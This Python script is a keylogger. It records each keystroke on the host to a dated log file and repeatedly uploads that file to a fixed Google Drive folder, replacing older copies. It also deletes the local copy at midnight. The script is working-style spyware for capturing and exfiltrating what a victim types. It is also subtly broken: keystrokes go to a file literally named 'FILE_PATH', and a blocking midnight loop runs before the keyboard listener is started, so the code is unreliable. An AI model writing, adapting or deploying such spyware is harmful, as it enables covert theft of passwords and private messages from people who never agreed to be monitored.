from pynput import keyboard
import os
import socket
from datetime import datetime
import time
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import threading

# Path to your credentials JSON file
CLIENT_SECRET_FILE = 'client_secret_file.json'
SCOPES = ['https://www.googleapis.com/auth/drive.file']


# Authenticate and create the service
def authenticate_google_drive():
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(CLIENT_SECRET_FILE, SCOPES)
            creds = flow.run_local_server(port=0)
        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    return build('drive', 'v3', credentials=creds)


service = authenticate_google_drive()

# File to be uploaded
now = datetime.now()
formatted_now = now.strftime("%d-%m-%Y")
hostname = socket.gethostname()
FILE_PATH = hostname + "_keylog_" + formatted_now + ".txt"
FOLDER_ID = '1D1vF9XycXB6J35HzRQ9qn2nlD4YUnLv9'  # Optional: If you want to upload to a specific folder


def delete_existing_file(file_name, folder_id=None):
    query = f"name = '{file_name}'"
    if folder_id:
        query += f" and '{folder_id}' in parents"

    results = service.files().list(q=query, spaces='drive', fields='files(id, name)').execute()
    items = results.get('files', [])
    for item in items:
        service.files().delete(fileId=item['id']).execute()
        print(f"Deleted file: {item['name']} (ID: {item['id']})")


def upload_file(file_path, file_name, folder_id=None):
    delete_existing_file(file_name, folder_id)

    file_metadata = {'name': file_name}
    if folder_id:
        file_metadata['parents'] = [folder_id]

    media = MediaFileUpload(file_path, mimetype='text/plain')
    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"Uploaded file ID: {file.get('id')}")


# Autosync functionality
def autosync(file_path, file_name, folder_id=None, interval=60):
    last_modified = os.path.getmtime(file_path)

    while True:
        current_modified = os.path.getmtime(file_path)
        if current_modified != last_modified:
            print(f"Changes detected in {file_path}. Uploading to Google Drive...")
            upload_file(file_path, file_name, folder_id)
            last_modified = current_modified
        time.sleep(interval)


def keyPressed(key):
    print(str(key))
    with open("FILE_PATH", "a") as logKey:
        logKey.write("\n")
        try:
            logKey.write(key.char)
        except AttributeError:
            if key == key.space:
                logKey.write(" ")
            elif key == key.enter:
                logKey.write("\n")
            else:
                logKey.write(str(key))
                logKey.write(" ")


def delete_file_at_midnight(file_path):
    while True:
        # Get the current time
        now = datetime.now()

        # Check if the current time is 12:00 AM
        if now.strftime("%H:%M:%S") == "00:00:00":
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"{file_path} has been deleted.")
            else:
                print(f"{file_path} does not exist.")

            # Sleep for a minute to avoid multiple deletions in the same minute
            time.sleep(60)

        # Sleep for a minute before checking the time again
        time.sleep(60)


if __name__ == "__main__":
    # Start the autosync in a separate thread with a 60-second interval (or adjust as needed)
    autosync_thread = threading.Thread(target=autosync, args=(FILE_PATH, FILE_PATH, FOLDER_ID, 30))
    autosync_thread.daemon = True
    autosync_thread.start()

    # Start the keyboard listener
    listener = keyboard.Listener(on_press=keyPressed)
    delete_file_at_midnight(FILE_PATH)
    listener.start()
    listener.join()  # Keep the script running



